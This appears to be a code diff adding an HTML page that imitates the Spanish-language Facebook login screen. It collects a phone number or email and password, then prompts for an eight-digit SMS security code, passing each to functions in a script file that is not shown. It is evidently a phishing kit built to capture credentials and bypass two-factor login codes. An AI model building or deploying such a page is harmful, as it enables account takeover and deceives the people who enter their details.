@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook</title>
+    <link rel="stylesheet" href="./css/style.css">
+    <link rel="shortcut icon" href="./img/logo.png" type="image/x-icon">
+</head>
+
+<body>
+    <div id="loader">
+        Cargando...
+    </div>
+
+    <div class="container-formulario" id="login-form">
+        <p class="idioma">Español</p>
+        <img class="logo" src="./img/logo.png" alt="">
+        <input type="text" placeholder="Celular o correo electrónico">
+        <input type="password" placeholder="Contraseña">
+        <button onclick="sendMessage()">Iniciar Sesión</button>
+        <a href="">¿Olvidaste tu contraseña?</a>
+    </div>
+
+    <div id="otp-form">
+        <h2>Introduce el código de seguridad:</h2>
+        <p>Busca en el teléfono un mensaje de texto con tu código de 8 caracteres.</p>
+        <div class="otp-inputs">
+            <input type="number" maxlength="1" oninput="moveToNext(this)">
+            <input type="number" maxlength="1" oninput="moveToNext(this)">
+            <input type="number" maxlength="1" oninput="moveToNext(this)">
+            <input type="number" maxlength="1" oninput="moveToNext(this)">
+            <input type="number" maxlength="1" oninput="moveToNext(this)">
+            <input type="number" maxlength="1" oninput="moveToNext(this)">
+            <input type="number" maxlength="1" oninput="moveToNext(this)">
+            <input type="number" maxlength="1" oninput="moveToNext(this)">
+        </div>
+        <button onclick="sendMessage2()">Enviar</button>
+    </div>
+
+    <div class="container-bottom">
+        <a href="#"><button>Crear cuenta nueva</button></a>
+    </div>
+
+    <img class="meta" src="./img/meta-logo.png" alt="">
+
+    <div class="container-mini-footer">
+        <p>Información</p>
+        <p>Ayuda</p>
+        <p>Más</p>
+    </div>
+
+    <script src="./js/script.js"></script>
+</body>
+
+</html>
